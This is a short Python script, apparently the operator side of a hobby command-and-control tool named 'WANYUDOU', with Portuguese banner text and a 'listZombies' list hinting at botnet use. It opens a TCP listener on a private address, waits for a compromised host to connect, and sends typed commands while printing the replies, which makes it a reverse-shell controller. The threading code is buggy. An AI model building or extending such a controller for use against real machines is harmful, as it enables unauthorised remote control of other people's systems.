import socket
import time
import subprocess
import threading


def listen():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("172.16.236.21", 45678))
    sock.listen()
    print("\n\n\nOUÇA COM ATENÇÃO...TEM ALGO LÁ FORA?")
    conne, addr = sock.accept()
    with conne:
        print(f"TE OUVI!! ALI!")
        while True:
            multiThread(conne)

def receivingData(session):
        data = session.recv(2048)
        print(data.strip())

def sendingData(session):
        command = input()
        print(command.encode())
        session.send(command.encode())

def multiThread(session):
    threading.Thread(target=sendingData(session)).start()
    threading.Thread(target=receivingData(session)).start()





if __name__ == '__main__':
    listZombies = []
    print('WELCOME TO WANYUDOU!! (THE GOOD SIDE)')
    print("""
      |_|   ,
     ('.') ///
     <(_)`-/'
 <-._/J L /  -WANYUDOU-""")
    listen()
